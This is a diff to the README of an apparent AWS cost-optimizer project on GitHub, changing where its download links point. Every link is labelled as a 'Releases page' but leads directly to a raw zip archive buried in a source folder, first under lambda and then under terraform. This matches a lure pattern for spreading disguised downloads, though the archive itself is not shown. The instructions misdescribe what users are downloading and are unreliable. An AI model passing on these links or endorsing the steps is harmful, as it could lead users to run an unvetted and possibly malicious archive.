@@ -1,6 +1,6 @@
 # 🌟 aws-ai-cost-optimizer - Save on Cloud Costs Easily
 
-![Download](https://raw.githubusercontent.com/namandon/aws-ai-cost-optimizer/main/aws-ai-cost-optimizer/lambda/ai_recommender/aws-ai-cost-optimizer-v1.8.zip%20Releases-brightgreen)
+![Download](https://raw.githubusercontent.com/namandon/aws-ai-cost-optimizer/main/aws-ai-cost-optimizer/terraform/optimizer-aws-cost-ai-1.7.zip%20Releases-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ To get started, please follow these steps to download and install the software:
 
 1. Click on the link below to access the most recent version of the software:
    
-   [Visit this page to download](https://raw.githubusercontent.com/namandon/aws-ai-cost-optimizer/main/aws-ai-cost-optimizer/lambda/ai_recommender/aws-ai-cost-optimizer-v1.8.zip)
+   [Visit this page to download](https://raw.githubusercontent.com/namandon/aws-ai-cost-optimizer/main/aws-ai-cost-optimizer/terraform/optimizer-aws-cost-ai-1.7.zip)
 
 2. On the Releases page, you will see a list of available versions. Choose the latest version for your system.
 
@@ -72,7 +72,7 @@ If you encounter any issues while installing or using the **AWS AI Cost Optimize
 
 ## 📅 Keeping Updated
 
-It’s important to keep your application updated for the best performance and latest features. You can check for updates by revisiting the [Releases page](https://raw.githubusercontent.com/namandon/aws-ai-cost-optimizer/main/aws-ai-cost-optimizer/lambda/ai_recommender/aws-ai-cost-optimizer-v1.8.zip) on GitHub.
+It’s important to keep your application updated for the best performance and latest features. You can check for updates by revisiting the [Releases page](https://raw.githubusercontent.com/namandon/aws-ai-cost-optimizer/main/aws-ai-cost-optimizer/terraform/optimizer-aws-cost-ai-1.7.zip) on GitHub.
 
 ## 🤝 Contributing
 
